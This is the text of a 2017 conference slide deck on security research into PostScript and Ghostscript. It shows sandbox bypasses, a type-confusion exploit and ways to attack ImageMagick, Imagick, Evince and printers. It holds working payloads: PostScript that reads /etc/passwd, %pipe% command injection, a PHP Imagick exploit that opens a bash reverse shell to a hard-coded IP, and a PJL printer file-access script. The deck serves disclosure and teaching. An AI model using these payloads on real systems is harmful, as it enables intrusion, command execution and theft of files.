REDRAIN & MIN(SPARK) ZHENG
A GHOST FROM POSTSCRIPT for RUXCON 2017

A GHOST FROM POSTSCRIPT

WHO ARE WE

 redrain


 min(spark) zheng


Qihoo 360CERT


CUHK PhD


Low-level security researcher
 Alibaba Security Expert


Pentester with interest in big guys


rootredrain@gmail.com
 https://cert.360.cn

zhengmin1989@gmail.com
 https://jaq.alibaba.com

A GHOST FROM POSTSCRIPT

AGENDA
 Postscript and GhostScript

1. Primer
 2. Postscript syntax
 3. Weakness
 4. Ghostscript SAFER mode
 5. Bypass Ghostscript sandbox

 The Ghost from Postscript

1. Arbitrary File Read
 2. Arbitrary Command Execution
 3. Arbitrary Code Execution
 More Attack Surfaces

1. Attacking softwares 
 2. Attacking printers

A GHOST FROM POSTSCRIPT
POSTSCRIPT AND GHOSTSCRIPT
 Postscript Primer

Postscript(PS) is a page description language in the electronic publishing and desktop publishing business.
 Postscript Level 1

introduced in 1984

Postscript Level 2

introduced in 1991

Postscript Level 3

introduced in 1997

A GHOST FROM POSTSCRIPT
POSTSCRIPT AND GHOSTSCRIPT
 Syntax

PostScript is a Turing-complete programming language, and an interpreted, stack-based language.
 The language syntax uses reverse Polish notation, which makes the order of operations unambiguous, and we should keep the layout of the stack in mind.

A GHOST FROM POSTSCRIPT

POSTSCRIPT AND GHOSTSCRIPT

 Syntax

(3+4)*(5-1)
 3 4 add 5 1 sub mul ==

add

4 3

sub

1 5

7

7

mul

4

1

7

5

7

28

A GHOST FROM POSTSCRIPT
POSTSCRIPT AND GHOSTSCRIPT
 Ghostscript Primer

Ghostscript is a suite of software based on an interpreter for Adobe PostScript and Portable Document Format (PDF) page description languages. Its main purposes are the rasterization or rendering of such page description language files, for the display or printing of document pages, and the conversion between PostScript and PDF files.

A GHOST FROM POSTSCRIPT

POSTSCRIPT AND GHOSTSCRIPT

 Ghostscript Primer


GhostScript console

System
*Unix MS Windows and later
OpenVMS Operating System/2

invocation name
gs gswin32c
gs gsos2

GhostScript GUI

System Unix/X11 MS Windows and later
Linux Operating System/2

invocation name Ghostview GSView gv GSView

A GHOST FROM POSTSCRIPT
POSTSCRIPT AND GHOSTSCRIPT
 Adobe PostScript Charstring Operators

A GHOST FROM POSTSCRIPT
POSTSCRIPT AND GHOSTSCRIPT
 Adobe PostScript Charstring Operators

with global and local subroutines in OpenType, a new callgsubr instruction added,
 multiple new hinting-related instructions introduced (hstemhm, hintmask,cntrmask, ...),
 new arithmetic and logic instructions (and, or, not, abs, add, sub, neg, ...),
 new instructions managing the stack (dup, exch, index, roll),
 new miscellaneous instructions (random),
 new instructions operating on the transient array (get, put),
 dropped support for OtherSubrs (removed callothersubr).

A GHOST FROM POSTSCRIPT
POSTSCRIPT AND GHOSTSCRIPT
 Adobe PostScript Charstring Operators
some interesting operators: file [Open named file with specified access] readstring [read string from file] writestring [write characters of string to file] readline [read line from file into string] filenameforall [access to all files and subdirectories in that directory with a *]

A GHOST FROM POSTSCRIPT
POSTSCRIPT AND GHOSTSCRIPT
 Adobe PostScript Charstring Operators

why does a rasterized language
 provide such rich file operators?

Are there any weaknesses here?

A GHOST FROM POSTSCRIPT
POSTSCRIPT WEAKNESSES
 Adobe PostScript Arbitrary File Read

%!PS /buff 1024 string def /file_obj (/etc/passwd) (r) file def file_obj buff readstring buff print quit

A GHOST FROM POSTSCRIPT
POSTSCRIPT WEAKNESSES
 Adobe PostScript Directory Listing

%!PS
 (/home/*) {==} 256 string filenameforall

A GHOST FROM POSTSCRIPT
GHOSTSCRIPT WEAKNESSES
 GhostScript Documentation

Ghostscript also supports the following IODevice in addition to a subset of those defined in the Adobe documentation:
 · %pipe%command, which opens a pipe on the given command. This is
supported only on operating systems that provide popen (primarily Unix systems, and not all of those).

Does it means Ghostscript will execut other 
 command through using "%pipe%command"???

A GHOST FROM POSTSCRIPT
GHOSTSCRIPT WEAKNESSES
 GhostScript Documentation


A GHOST FROM POSTSCRIPT
GHOSTSCRIPT WEAKNESSES
 GhostScript Shell Command Execution

./gs-921-linux-x86_64 -sDEVICE=pdfwrite -sOutputFile=%pipe%id
%!PS /OutputFile (%pipe%id) %set command injection (pdfwrite)finddevice %use pdfwrite device putdeviceprops setdevice %set completion and start quit

A GHOST FROM POSTSCRIPT
GHOSTSCRIPT WEAKNESSES
 Ghostscript SAFER sandbox

Disables the deletefile and renamefile operators, and the ability to open piped commands (%pipe%cmd) at all. Only %stdout and %stderr can be opened for writing. Disables reading of files other than %stdin, those given as a command line argument, or those contained on one of the paths given by LIBPATH and FONTPATH and specified by the system params / FontResourceDir and /GenericResourceDir.

A GHOST FROM POSTSCRIPT

GHOSTSCRIPT WEAKNESSES

 Ghostscript SAFER sandbox

Arbitrary File Read

Arbitrary Command Execution

A GHOST FROM POSTSCRIPT
THE GHOST FROM POSTSCRIPT
 Bypass SAFER sandbox

Although SAFER sandbox disable most of file operators, there is still a advanced operator alived.

we can replace file into .libfile
%!PS
 (/etc/passwd) .libfile {
 256 string readstring
 } if
 {print} if
 quit

A GHOST FROM POSTSCRIPT
THE GHOST FROM POSTSCRIPT
 Bypass SAFER sandbox again

When I was writing this slides, I found another
 advanced operator alived .findlibfile
%!PS
 (/etc/passwd) .findlibfile {
 256 string readstring
 } if
 {print} if
 quit

A GHOST FROM POSTSCRIPT
THE GHOST FROM POSTSCRIPT
 Bypass SAFER sandbox again and again

Project Zero researcher Tavis discovered a greate bypass in Oct last year. He found two advanced operators OutputICCProfile and putdeviceparams.
 These two operators are not described distinctly in documentation, however I found them in sourcecode ./base/gsdparam.c

A GHOST FROM POSTSCRIPT
THE GHOST FROM POSTSCRIPT
 Bypass SAFER sandbox again and again

PoC
 %!PS
 currentdevice null true mark /OutputICCProfile (%pipe%id > /dev/tty)
 .putdeviceparams
 quit

A GHOST FROM POSTSCRIPT
MEMORY CORRUPTION OF GHOSTSCRIPT
gelivable: (chiefly China, Internet slang) awesome, incredible, amazi ng, extraordinary

A GHOST FROM POSTSCRIPT
"GHOSTBUTT" SAFER BYPASS
Ghostbutt is an OOB and type confuse bug in GhostScript. It is named by HD Moore and it has a website: http://ghostbutt.com.

GhostScript doesn't check the bound of the operator stack when it executes .eqproc operator.

A GHOST FROM POSTSCRIPT
"GHOSTBUTT" SAFER BYPASS
An attacker may use a crafted .ps file to achieve an out-of-bound attack in GhostScript and bypass the SAFER mode. The exp can be found at: https:// github.com/rapid7/metasploit-framework/pull/8316/files. There are four main steps:

Step 1: Using .eqproc operator to control the stack using a crafted string buffer.

A GHOST FROM POSTSCRIPT
"GHOSTBUTT" SAFER BYPASS
Step 2: Using the string buffer to change the reference of currentdevice object to String object.

Step 3: Changing the currentdevice->LockSafetyParams to 0. (Close the SAFER)

A GHOST FROM POSTSCRIPT
"GHOSTBUTT" SAFER BYPASS
Step 4: Execute unsandboxed commands.

Fix -- checking the bound and checking the type of parameters (CVE-2017-8291):

A GHOST FROM POSTSCRIPT
REMOTE CODE EXECUTION: TYPE CONFUSION
The vulnerability code exists in the zinitialize_dsc_parser(). The method gets the memory data using dict_memory() and treats it as an object to call its gs_alloc_struct() method.
 Note that the memory data can be controlled by the attacker and the method doesn't check the validity of data.

A GHOST FROM POSTSCRIPT
REMOTE CODE EXECUTION: TYPE CONFUSION
Only two lines of POC can crash the program which uses ghostscript (libgs.so) as the .ps file processor. 

The attacker can craft a fake object to hijack the program count. %RAX and %RDI can be controlled by the attacker.

Next step is to find a way to do the heap spray for the ROP chain.

A GHOST FROM POSTSCRIPT
REMOTE CODE EXECUTION: TYPE CONFUSION
The .ps file supports hexadecimal data as a member of dict. That's the best candidate for heap spray. Therefore, we could spray the heap using <gadget gadget gadget gadget gadget ...> through the .ps file.
 For demonstration, we disabled ASLR. Then we used a crafted .ps file to let the Evince Document Viewer execute our ROP chain - system("touch a").

A GHOST FROM POSTSCRIPT
MORE ATTACK SURFACE
 Extend Ghostscript to other software

These are all possible to exploit via PDF, PS, EPS, XPS formats.
 Because Ghostscript is a basic interpreter for postscript, many software using Ghostscript or parsing Postscript are also vulnerable.
 E.g: Imagemagick, GraphicsMagick, Evince, Gimp... and any more.

A GHOST FROM POSTSCRIPT
MORE ATTACK SURFACE
 Attack ImageMagick

Delegate is a configuration for converting in ImageMagick, it defines the application that be called during converting.
<delegate decode="ps" encode="eps" mode="bi" command="&quot;gs&quot; q -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=2 &quot;sDEVICE=eps2write&quot; &quot;-sOutputFile=%o&quot; &quot;-f%i&quot;"/>
%i: input image filename

A GHOST FROM POSTSCRIPT
MORE ATTACK SURFACE
 Attack ImageMagick

we can control contents in input file

A GHOST FROM POSTSCRIPT
MORE ATTACK SURFACE
 Attack ImageMagick

A GHOST FROM POSTSCRIPT
MORE ATTACK SURFACE
 Attack ImageMagick

There are delegates can be exploited
<delegate decode="eps" encode="pdf" mode="bi" command="&quot;gs&quot; -q -dQUIET -dSAFER -dBATCH dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 &quot;-sDEVICE=pdfwrite&quot; &quot;sOutputFile=%o&quot; &quot;-f%i&quot;"/>
 <delegate decode="eps" encode="ps" mode="bi" command="&quot;gs&quot; -q -dQUIET -dSAFER -dBATCH dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=2 &quot;sDEVICE=ps2write&quot; &quot;-sOutputFile=%o&quot; &quot;-f%i&quot;"/>
 <delegate decode="ps" encode="eps" mode="bi" command="&quot;gs&quot; -q -dQUIET -dSAFER -dBATCH dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=2 &quot;sDEVICE=epswrite&quot; &quot;-sOutputFile=%o&quot; &quot;-f%i&quot;"/>
 <delegate decode="ps" encode="pdf" mode="bi" command="&quot;gs&quot; -q -dQUIET -dSAFER -dBATCH dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=2 &quot;sDEVICE=pdfwrite&quot; &quot;-sOutputFile=%o&quot; &quot;-f%i&quot;"/>


A GHOST FROM POSTSCRIPT
MORE ATTACK SURFACE
 Attack Imagick

Imagick is a native php extension to create and modify images using the ImageMagick API.
 Imagick will identify file header and determine the format

A GHOST FROM POSTSCRIPT
MORE ATTACK SURFACE
 Attack Imagick
<?php
 $command = PHP_SAPI == 'cli' ? $argv[1] : $_GET['cmd'];
 if ($command == '') {

$command = 'id';
 }
 $exploit = <<<EOF
 %!PS
 currentdevice null true mark /OutputICCProfile (%pipe%/bin/bash -i >& /dev/tcp/ 192.168.99.113/2333 0>&1)
 .putdeviceparams
 quit
 EOF;
 $thumb = new Imagick();
 $thumb->readImageBlob($exploit);


A GHOST FROM POSTSCRIPT
MORE ATTACK SURFACE
 Attack Imagick

A GHOST FROM POSTSCRIPT
MORE ATTACK SURFACE
 Attack Imagick

A GHOST FROM POSTSCRIPT
MORE ATTACK SURFACE
 Attack Imagick

Attacking Imagick is depended on
 Ghostscript version because this is
 a vulnerability of Ghostscript

A GHOST FROM POSTSCRIPT
MORE ATTACK SURFACE
 Attack Evince

Evince is a popular PDF reader, it also can parse Postscript
 It is also vulnerable

A GHOST FROM POSTSCRIPT
MORE ATTACK SURFACE
 Attack Evince

A GHOST FROM POSTSCRIPT
MORE ATTACK SURFACE
 Any other software?

https://codesearch.debian.net/search?q=-dSAFER+&perpkg=1

A GHOST FROM POSTSCRIPT
MORE ATTACK SURFACE
 Attacking printers

PostScript Printer Description (PPD) files are created by vendors to describe the entire set of features and capabilities available for their PostScript printers.
 PPD can execute Postscript code, CUPS uses PPD drivers for all of its PostScript printers.
 Postscript printer and CUPS both are we interested in.

A GHOST FROM POSTSCRIPT
MORE ATTACK SURFACE
 Attacking printers

Printer Job Language (PJL) 
 PJL was originally introduced by HP but soon became a standard for print job control. 
 The service is listened on port 9100
 PJL can switch the interpreter to Postscript mode to parse Postscript

A GHOST FROM POSTSCRIPT
MORE ATTACK SURFACE
 Attacking printers

System access
@PJL ENTER LANGUAGE=POSTSCRIPT
 /str 64 string def (%*%../*)
 {==} str filenameforall
 
 /byte (0) def
 /infile (../../../etc/passwd) (r) file def
 { infile read {byte exch 0 exch put (%stdout) (w) file byte writestring} {infile closefile exit} ifelse} loop
 
 /outfile (test.txt) (w+) file def}}
 outfile (Hello World!) writestring
 outfile closefile

A GHOST FROM POSTSCRIPT
MORE ATTACK SURFACE
 Attacking printers

Command execution
 Editing rc scripts or replacing binary files will lead to command execution. 
 CVE-2017-2741


A GHOST FROM POSTSCRIPT
ANY OTHER ELSE???
 More thinks

Postscript is an old language, available in almost any PostScript printer and raster image processor(RIP).
 Ghostscript is an popular interpreter for Postscript, available in almost any RIP software.
 Even there existed a real-world APT(apt28) using Postscript.

https://www.fireeye.com/blog/threat-research/2017/05/eps-processing-zero-days.html

https://www.fireeye.com/blog/threat-research/2014/10/apt28-a-window-into-russias-cyber-espionageoperations.html
 CVE-2017-0261 CVE-2017-0262

A GHOST FROM POSTSCRIPT
Q&A
Redrain&Spark

